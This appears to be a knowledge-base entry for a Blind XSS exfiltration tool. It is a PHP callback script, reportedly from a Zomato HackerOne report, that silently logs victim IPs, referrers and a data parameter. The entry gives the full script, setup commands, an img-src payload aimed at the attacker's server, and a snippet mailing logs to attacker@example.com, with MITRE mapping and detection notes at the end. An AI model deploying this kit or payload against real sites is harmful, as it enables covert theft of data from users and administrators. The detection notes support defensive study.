---
id: tool-zomato-php
url: null
tags:
  - xss
  - callback
  - php
  - exfiltration
type: tool
verified: false
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.061Z'
validated: true
submitted: true
---
# zomato-php-callback

**Status**: Unverified

## Overview

Custom PHP script designed as a callback endpoint for Blind XSS payloads, logging request metadata to facilitate data exfiltration from victim browsers in security testing scenarios.

## Description

This tool is a simple, single-file PHP script used in the Zomato Blind XSS exploitation to capture incoming HTTP requests triggered by an img src payload. It appends details like timestamp, remote IP, HTTP referrer, and GET parameter 'c' to a log file without outputting anything to the response, making it stealthy. Commonly used in web vulnerability assessments to confirm XSS execution and gather reconnaissance on admin users.

## Features

- Feature 1: Silent logging of request details (time, IP, referrer, 'c' param)
- Feature 2: Appends to log.txt using FILE_APPEND for persistent records
- Feature 3: Handles GET requests; no authentication or validation

## Installation

### Requirements

- PHP 5+ enabled web server (Apache, Nginx)
- Writeable directory for log.txt

### Install Commands

```bash
# Create the script file
sudo nano /var/www/html/zomato.php

# Add PHP content:
<?php
if (isset($_GET['c'])) {
    $log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: ' . $_SERVER['REMOTE_ADDR'] . ' Referer: ' . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'none') . ' C: ' . $_GET['c'] . "\n";
    file_put_contents('log.txt', $log, FILE_APPEND);
}
?>

# Set permissions
sudo chmod 644 /var/www/html/zomato.php
sudo touch /var/www/html/log.txt
sudo chmod 666 /var/www/html/log.txt
```

## Basic Usage

```bash
# No CLI; access via HTTP
curl "http://your-server-ip/zomato.php?c=test"
```

### Common Options

| Option | Description |
|--------|-------------|
| None (GET-based) | Relies on query params like ?c=value |
| Server config | Customize log format in PHP code |

## Examples

### Example 1: Basic Usage

Deploy on server and trigger via payload: <img src='http://your-server-ip/zomato.php?c=zomato_xss' />. Check log.txt after request.

### Example 2: Advanced Usage

Modify script to email logs or store in DB for larger-scale ops:

```php
// Add to script
mail('attacker@example.com', 'XSS Hit', $log);
```

## Expected Output

No HTTP response body; log.txt updates with: 'Time: 2023-10-01 12:00:00 IP: 192.168.1.1 Referer: https://admin.zomato.com/dashboard C: zomato_xss'

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Exfiltration Over Command and Control Channel]]

### Tactics

- [[Collection]]
- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual external HTTP GET requests from internal browsers to unknown IPs
- Log files with patterns of timestamped IP/referrer entries
- Network traffic to ad-hoc PHP endpoints

## Related Procedures


## Related Tools

- [[Burp Suite]] (for payload delivery)
- [[ngrok]] (for tunneling callbacks)

## References

- Custom script from HackerOne report #461272
- PHP file_put_contents documentation
